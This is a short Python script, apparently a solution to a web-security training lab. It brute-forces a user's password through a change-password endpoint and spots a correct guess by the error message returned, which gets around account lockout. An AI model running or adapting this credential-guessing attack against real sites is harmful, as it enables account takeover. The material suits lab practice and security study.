from django.template import Origin
from git import Reference
import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def getpassword(url,user):
    path = "my-account/change-password"
    cookie ={'session':'fvIwMjXotI2hAV8xwOTOkluCgDWCgeXY'}
    referer = {'Referer': 'https://ac7b1fd21e5e2ce3c0e1469600260018.web-security-academy.net/my-account'}
    origin={'Origin': 'https://ac7b1fd21e5e2ce3c0e1469600260018.web-security-academy.net'}
    with open('passwords','r') as passwords:
        password = passwords.readlines()
        for p in password:
            p = p.strip('\n')

            params = {'username': user, 'password':p,'new-password-1':'123','new-password-2':'abc'}
            r = requests.post(url+path, data=params, verify=False, proxies=proxies,cookies=cookie)
            print (r.headers)
            if "New passwords do not match" in r.text:
                print (params)
                # Sleep for 61 seconds as login is blocked for 1 minutes
                break

def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("[+] Brute-Forcing login page - Bypassing account lock")

    getpassword(url,'carlos')

if __name__ == "__main__":
    main()